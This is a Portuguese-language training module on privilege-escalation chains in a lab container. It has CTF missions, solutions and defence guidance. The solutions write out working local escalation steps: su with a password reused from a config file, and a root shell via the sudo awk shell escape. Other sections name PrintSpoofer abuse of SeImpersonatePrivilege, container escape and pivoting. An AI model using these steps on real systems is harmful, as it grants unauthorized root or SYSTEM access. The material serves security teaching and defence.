+Há uma senha ali, e o comentário entrega o resto. Seu objetivo: usar essa credencial para virar o usuário `dev` e ler `/home/dev/flag_dev.txt`.
+
+<Hint title="Dica 1 — o que o comentário diz">
+O comentário avisa que o `dev` **reaproveita** a senha do banco no login do shell. Isso é `credential reuse`: a mesma senha em dois lugares. O comando que troca de usuário local pedindo senha é o `su`.
+</Hint>
+
+<Solution title="Solução">
+```console
+www-data@privesc:/$ su dev
+Password:
+dev@privesc:/$ id
+uid=1000(dev) gid=1000(dev) groups=1000(dev)
+dev@privesc:/$ cat /home/dev/flag_dev.txt
+```
+
+Você digita `D3vOps!redis2024` (a senha não aparece na tela) e vira `dev`. O `cat` imprime a flag que você manda no cartão. **Lição:** o salto não foi um exploit — foi uma senha achada num arquivo de config e reaproveitada numa conta do sistema. Esse é um dos vetores de salto mais comuns do mundo real.
+</Solution>
+
+<FlagInput task="missao-1-foothold-dev" />
+
+### 5.3 Missão 2 — Do dev ao root (desafio)
+
+Você é `dev` agora. **Não** continue pensando como `www-data`: re-enumere como a nova identidade (etapa 4 do ciclo). O vetor que leva a `root` existe para o `dev` e **não** existia para o foothold. Objetivo: virar `root` e ler `/root/flag_root.txt`.
+
+<Hint title="Dica 1 — re-enumere como dev">
+A primeira coisa a conferir numa conta nova é `sudo -l`: o que ela pode rodar como `root`. O `www-data` não tinha nada; o `dev` tem **uma** regra, com `NOPASSWD`. O binário liberado parece inofensivo.
+</Hint>
+
+<Hint title="Dica 2 — o escape pelo GTFOBins">
+Esse binário está no [GTFOBins](https://gtfobins.github.io/), seção **Sudo**. Ele executa um comando que você passa — no caso do `awk`, via `BEGIN { system("...") }`. Peça a ele um `/bin/sh`.
+</Hint>
+
+<Solution title="Solução">
+```console
+dev@privesc:/$ sudo -l
+User dev may run the following commands on privesc:
+    (root) NOPASSWD: /usr/bin/awk
+dev@privesc:/$ sudo awk 'BEGIN{system("/bin/sh")}'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/flag_root.txt
+```
+
+O `awk` roda o comando do `BEGIN` — e o `sudo` o roda como `root`. Aqui o `uid` real é 0: `root` pleno. **Lição:** o salto vertical só apareceu **depois** do lateral, e só para a identidade `dev`. Se você tivesse ficado "preso" na cabeça do `www-data`, teria concluído que a máquina era segura. Re-enumerar a cada salto é o que destrava a cadeia.
+</Solution>
+
+<FlagInput task="missao-2-root" />
+
+### 5.4 Missão 3 — A cadeia Windows até SYSTEM (análise)
+
+O Windows não roda no seu WSL, mas a decisão que importa — **qual caminho da cadeia funciona neste host** — você treina com saídas sanitizadas (host `SRV-APP01`, conta `apppool`, IP `192.168.0.10`). Cole o bloco inteiro de uma vez no terminal do Ubuntu; ele cria em `/tmp/privesc-win-chain` as saídas de um host Windows com foothold no pool do IIS e **três** caminhos estagiados até `SYSTEM`, cada um com um token em base64.
+
+```bash
+ROOT=/tmp/privesc-win-chain
+rm -rf "$ROOT"; mkdir -p "$ROOT"; cd "$ROOT"
+
+cat > foothold.txt <<'EOF'
+whoami          -> iis apppool\apppool      (foothold: web shell no pool do IIS)
+whoami /priv    -> SeImpersonatePrivilege   Enabled
+host Print Spooler (sc query Spooler) -> STATE: 4 RUNNING
+EOF
+
+cat > caminhos.txt <<'EOF'
+Tres caminhos ate SYSTEM foram estagiados neste host. Cada um tem um token(base64).
+
+[A] Abusar de SeImpersonatePrivilege com o PrintSpoofer (coagir o Print Spooler,
+    que roda como LocalSystem, a se conectar a um named pipe e vestir o token).
+    token=RkxBR3t3aW4tY2hhaW4taWlzLXByaW50c3Bvb2Zlci10by1zeXN0ZW19
+
+[B] Subverter o servico "TelemetryAgent", que roda como conta virtual
+    (NT SERVICE\TelemetryAgent), nao LocalSystem.
+    token=ZGVjb3k6IGVzdGUgc2VydmljbyByb2RhIGNvbW8gY29udGEgdmlydHVhbCAoTlQgU0VSVklDRSksIG5hbyBMb2NhbFN5c3RlbTsgc3VidmVydGUtbG8gbmFvIGVudHJlZ2EgU1lTVEVN
+
+[C] Reconfigurar o servico "UpdateSvc" - mas o accesschk mostra que voce so tem
+    SERVICE_QUERY_STATUS sobre ele.
+    token=ZGVjb3k6IHZvY2Ugc28gdGVtIFNFUlZJQ0VfUVVFUllfU1RBVFVTIGFxdWk7IGxlciBhIGNvbmZpZyBuYW8gcmVjb25maWd1cmEgbmFkYQ==
+EOF
+
+echo "Cenario pronto em $ROOT"; ls -1 "$ROOT"
+```
+
+Para decodificar um token, isole o valor depois de `token=` e passe para `base64 -d`. Seu objetivo: decidir qual caminho leva o foothold do IIS a `SYSTEM` **neste** host e decodificar o token dele — essa é a flag. Os outros dois decodificam para um `decoy:` que explica por que não servem.
+
+<Hint title="Dica 1 — comece pelo foothold">
+Leia `foothold.txt`. A identidade é o pool do IIS, que tem `SeImpersonatePrivilege` **Enabled**, e o `Print Spooler` está **RUNNING**. Isso casa com exatamente um dos três caminhos (releia a Seção 3.4 e o 6.5).
+</Hint>
+
+<Hint title="Dica 2 — descarte os decoys">
+O caminho [B] subverte um serviço que roda como **conta virtual**, não `LocalSystem` — subvertê-lo não dá `SYSTEM`. O caminho [C] depende de reconfigurar um serviço, mas você só tem `SERVICE_QUERY_STATUS` (ler, não mudar). Sobra um.
+</Hint>
+
+<Solution title="Solução">
+O foothold tem `SeImpersonatePrivilege` e o Spooler está ativo: o caminho **[A]**, o PrintSpoofer, é o que funciona — o foothold tem o privilégio (controle) e o Spooler, como `LocalSystem`, tem o poder. Decodifique o token do [A]:
+
+```console
+$ awk '/^\[A\]/{f=1} f&&/token=/{sub(/.*token=/,"");print;exit}' caminhos.txt | base64 -d; echo
+```
+
+A saída é a flag — mande no cartão. (O token do [B] decodifica para `decoy: este servico roda como conta virtual...` e o do [C], para `decoy: voce so tem SERVICE_QUERY_STATUS...`.) **Lição:** o caminho certo depende do host. No 6.5, com o Spooler desligado, a resposta foi o `AlwaysInstallElevated`; aqui, com o foothold do IIS e o Spooler ativo, é o abuso de token. Enumerar vários caminhos é o que garante uma alternativa.
+</Solution>
+
+<FlagInput task="missao-3-windows" />
+
+### 5.5 Documente o caminho (o seu primeiro attack path)
+
+Antes de limpar, faça o que todo pentester faz: registre o <GlossaryTerm term="attack path">attack path</GlossaryTerm>. Abra um arquivo e anote, para a cadeia Linux, **cada salto** com o comando, a evidência e um horário em UTC. Um modelo mínimo:
+
+<CodeBlock
+  title="~/privesc-chain/attack-path.md"
+  lang="text"
+  code={`# Attack path — alvo de treino privesc-chain (host: privesc)
+
+## Salto 0 — Foothold
+- Identidade: www-data (uid 33), via "web shell".
+- Evidencia: id -> uid=33(www-data).
+
+## Salto 1 — Lateral: www-data -> dev (credential reuse)
+- 2026-01-01T13:40Z  cat /var/www/app/config.php  -> senha do dev no config.
+- 2026-01-01T13:41Z  su dev                        -> uid=1000(dev).
+- Impacto: leitura de /home/dev (flag_dev).
+
+## Salto 2 — Vertical: dev -> root (sudo awk, GTFOBins)
+- 2026-01-01T13:45Z  sudo -l                       -> (root) NOPASSWD: /usr/bin/awk.
+- 2026-01-01T13:46Z  sudo awk 'BEGIN{system("/bin/sh")}' -> uid=0(root).
+- Impacto: controle total do host (flag_root).
+
+## Como cortar a cadeia (para o relatorio)
+- Nao reutilizar a senha do banco na conta dev; tirar segredos do config.
+- Remover a regra NOPASSWD do awk (ou trocar por comando sem shell escape).`}
+/>
+
+Esse arquivo é o embrião do relatório da Trilha 8. Guarde o hábito: anota-se **enquanto** se escala, não depois, de memória.
+
+### 5.6 Desligar e limpar
+
+Saia dos shells aninhados (`exit` até voltar ao `www-data` e sair). Como você subiu com `--rm`, o contêiner **desaparece sozinho**. Para apagar também a imagem:
+
+```console
+$ docker rmi privesc-chain:local
+```
+
+## 6. Variações e aprofundamento
+
+**Cadeias de mais saltos.** O mini-projeto tem dois saltos; alvos reais (e máquinas de CTF, que você verá na Trilha 8) encadeiam três, quatro, cinco: `www-data` → `backupuser` (por uma chave SSH legível) → `dba` (por uma senha no histórico) → `root` (por um `cron`). O método não muda — é o ciclo da 2.2 repetido. O que cresce é a disciplina de documentar.
+
+**Outros vetores de salto lateral.** Além da credencial em config, procure: chaves SSH privadas legíveis (`~/.ssh/id_*`), senhas no histórico (`~/.bash_history`), tokens em variáveis de ambiente (`/proc/<pid>/environ`), arquivos de backup (`.bak`, `.old`) e `tickets`/caches de credencial. Todos são `credential reuse` ou vazamento de segredo em roupagens diferentes.
+
+**Pivoting: o salto que atravessa a rede.** Virar `root` numa máquina muitas vezes é meio, não fim: dali você faz <GlossaryTerm term="pivoting">pivoting</GlossaryTerm> — usa o host comprometido como trampolim para alcançar uma rede interna que, de fora, era invisível. É o encadeamento saindo de uma máquina para a próxima, e é o tema que liga esta trilha à de Active Directory (Trilha 7).
+
+**Escapar do contêiner.** Como no 6.3: `root` dentro de um contêiner não é `root` no host. Num engajamento, depois de virar `root` no contêiner, o salto seguinte seria **escapar** — procurar `docker.sock` montado, capabilities excessivas (`--privileged`), montagens do host. No nosso treino, é justamente a ausência disso (e o `--network none`) que mantém tudo seguro.
+
+**A cadeia Windows com o Spooler desligado.** Se, na Missão 3, o Spooler estivesse `STOPPED` (como no 6.5), o caminho [A] morreria e você cairia nas primas do PrintSpoofer — RoguePotato, GodPotato — que usam outros serviços de coerção, ou em outro achado da enumeração (um serviço reconfigurável, o `AlwaysInstallElevated`). Ter mapeado vários caminhos é o que dá alternativa.
+
+## 7. Erros comuns
+
+- **Ficar "preso" na identidade antiga.** Pulou para o `dev` e continuou rodando a enumeração do `www-data`? O vetor vertical fica invisível. Rode `sudo -l`, `id`, `getcap` e cheque grupos **de novo**, como a nova identidade (a etapa 4 do ciclo).
+- **`su dev` falha com "Authentication failure".** Senha errada (confira o `config.php` com atenção, inclusive os caracteres especiais) ou você digitou num shell que não tem `su`. No alvo de treino a senha é a do config; copie-a exatamente.
+- **Ir atrás do kernel exploit primeiro.** É o reflexo errado. Esgote os caminhos confiáveis (credenciais, `sudo`, grupos, binários graváveis) antes de pensar em kernel — ele é o último recurso, pelo risco de derrubar o host.
+- **`sudo awk` pede senha.** Então a regra `NOPASSWD` não é para o `awk` ou você mirou o binário errado — releia o `sudo -l` (o alvo da regra e o usuário de destino).
+- **Decodificar o token errado na Missão 3.** Se o `base64 -d` devolve algo que começa com `decoy:`, você escolheu um caminho que não leva a `SYSTEM` neste host — releia as condições (conta do serviço, direito sobre ele, estado do Spooler) e tente o outro.
+- **Não anotar enquanto escala.** Reconstituir o caminho "de cabeça" no fim do dia perde horários, comandos exatos e evidências. O attack path se escreve **durante**.
+
+## 8. Defesa e mitigação
+
+A grande vantagem de pensar em cadeia: para defender, basta **cortar um elo**. O atacante precisa de todos; você precisa de um. Para cada elo deste módulo:
+
+**Elo 1 — o foothold (não deixe a aplicação ser uma porta larga).** Rode a aplicação com o **menor privilégio** possível e isole-a: um `www-data` que não lê mais do que precisa, sem acesso a segredos de outras contas. Containerize serviços e aplique `no-new-privileges` (6.3). Quanto menor o que o foothold enxerga, menor o próximo salto.
+
+**Elo 2 — o segredo reutilizado (mate o credential reuse).** Nunca reaproveite a mesma senha entre um serviço e uma conta do sistema, nem entre hosts. Tire segredos de arquivos de config legíveis: use um cofre (*secrets manager*), variáveis de ambiente restritas ou arquivos com dono e modo apertados (`600`, dono certo). Exemplo do que **não** fazer e do caminho melhor:
+
+```text
+# RUIM: senha em texto claro, legivel pela conta da aplicacao, e reusada no SO.
+$DB_PASS = 'D3vOps!redis2024';   // mesma senha do login do dev
+
+# MELHOR: segredo injetado so para o processo, senha distinta por servico/conta,
+# arquivo 600 e dono exclusivo (ou um secrets manager).
+$DB_PASS = getenv('DB_PASS');    // vem do ambiente do servico, nao do disco
+```
+
+**Elo 3 — a regra de `sudo` (delegue sem dar shell).** Nunca delegue por `sudo` um binário que executa outros programas (`awk`, `env`, `find`, `vim`, `less`...). Prefira um comando específico, sem *shell escape*, e evite `NOPASSWD`. Audite com `sudo -l` em cada conta e compare com o GTFOBins. No alvo, trocar `NOPASSWD: /usr/bin/awk` por um comando fechado (ou removê-lo) quebra o salto 2 — e a cadeia inteira, já que sem ele o `dev` não chega a `root`.
+
+**Elo Windows — o privilégio e o serviço.** Remova `SeImpersonatePrivilege` de contas que não precisam dele; trate toda conta de serviço com esse privilégio como quase-`SYSTEM`. Desligue o Print Spooler em servidores que não imprimem (fecha o coração do PrintSpoofer). Rode serviços com contas virtuais/gMSA de privilégio mínimo, não `LocalSystem`.
+
+**A barreira que contém tudo — encurtar o blast radius.** Mesmo que um elo escape, a segmentação limita o estrago: separe redes, bancos e contas, para que um foothold não alcance tudo (foi exatamente a barreira que faltou na Equifax). Dê privilégio mínimo em toda parte. O objetivo é que um host comprometido continue sendo **um** host comprometido, não a rede inteira.
+
+**Detecção da cadeia.** Isoladamente, um `su`, um `sudo` ou um `cat` de config passam despercebidos; é a **sequência** que denuncia. Um `cat` de arquivos de config por uma conta de serviço, seguido de um `su` para outra conta e de um `sudo` que abre `/bin/sh`, é um padrão que o `auditd` e um EDR reconhecem como *Privilege Escalation* (tática **TA0004** do MITRE ATT&CK). No Windows, um `cmd.exe`/`powershell.exe` nascido como `SYSTEM` a partir de um processo do pool do IIS (`w3wp.exe`) é a assinatura clássica dos potato. Monitorar a **cadeia**, não só o evento solto, é o que pega a escalação em flagrante.
+
+## 9. Exercícios
+
+Primeiro o quiz de teoria (ele conta para concluir o módulo e cobra o *porquê* do encadeamento, não a decoreba dos comandos):
+
+<Quiz task="quiz-final" />
+
+Depois, as três missões da Seção 5, cada uma com sua flag:
+
+- **Missão 1 — salto lateral:** do foothold `www-data` ao usuário `dev` por credential reuse; leia `/home/dev/flag_dev.txt`.
+- **Missão 2 — salto vertical:** de `dev` a `root` pela regra de `sudo`, re-enumerando como a nova identidade; leia `/root/flag_root.txt`.
+- **Missão 3 — cadeia Windows:** decida qual dos três caminhos leva o foothold do IIS a `SYSTEM` e decodifique o token certo.
+
+Para ir além, **sem flag**: no alvo de treino, **corte um elo** — tire a senha do `config.php`, ou dê uma senha distinta ao `dev`, ou remova a regra `NOPASSWD` do `awk` — e confirme que a cadeia inteira deixa de funcionar. Provar que um único corte quebra tudo é a melhor forma de internalizar a defesa. E escreva o attack path da 5.5 como se fosse entregá-lo a um cliente.
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Escalação real é uma **cadeia** de saltos, não um pulo: você parte de um foothold de baixo privilégio e encadeia lateral + vertical até `root`/`SYSTEM`.
+- O método é um **ciclo**: enumerar → escolher o vetor (confiável e silencioso primeiro, kernel exploit por último) → escalar → **re-enumerar como a nova identidade** → repetir.
+- O salto lateral deste módulo é a **credential reuse**: uma senha de config reaproveitada abre outra identidade, que enxerga o vetor vertical (uma regra de `sudo`) que o foothold não via.
+- No Windows, a lógica é a mesma; o caminho certo **depende do host** (aqui, foothold do IIS com `SeImpersonatePrivilege` + Spooler ativo → PrintSpoofer → `SYSTEM`).
+- **Documentar o attack path** (comando, evidência, horário) é parte técnica do trabalho, não burocracia — é o relatório.
+- Defender é **cortar qualquer elo** e encurtar o **blast radius**: privilégio mínimo, segredos isolados, `sudo` fechado, serviços sem privilégio excessivo, segmentação.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [GTFOBins](https://gtfobins.github.io/) — o catálogo dos binários Unix que viram shell quando rodados por `sudo` (o `awk` do salto 2 está lá).
+- [HAFNIUM targeting Exchange Servers (Microsoft Security Blog)](https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) — o relato oficial da cadeia ProxyLogon da Seção 4.
+- [MITRE ATT&CK — Privilege Escalation (TA0004)](https://attack.mitre.org/tactics/TA0004/) — o catálogo das técnicas de escalação, o vocabulário comum do relatório.
